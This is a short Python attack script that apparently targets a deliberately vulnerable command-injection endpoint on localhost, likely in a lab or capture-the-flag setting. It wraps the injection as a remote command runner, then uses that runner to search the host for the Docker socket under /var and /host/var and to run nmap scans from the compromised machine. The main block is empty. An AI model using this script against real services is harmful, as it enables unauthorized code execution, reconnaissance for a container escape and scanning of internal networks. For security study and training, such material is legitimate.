import sys
import requests
import pwn

def exec(command: str) -> tuple[str, str]:
    """Executes the given command on the remote machine."""
    headers = {'Content-Type': 'text/plain'}
    response = requests.post('http://localhost:8080/api/user/command-injection', headers=headers, data=command)
    body = response.json()

    if 'err' in body:
        print(body)
        raise Exception(body['err'])

    return body['stdout'], body['stderr']

def checkDocker():
    for path in ['/var', '/host/var']:
        print(exec(f"find {pwn.sh_string(path)} -type f -name docker.sock"))

def nmapScan(ipAddr):
    exec(f"nmap {ipAddr}")

#if __name__ == "__main__":
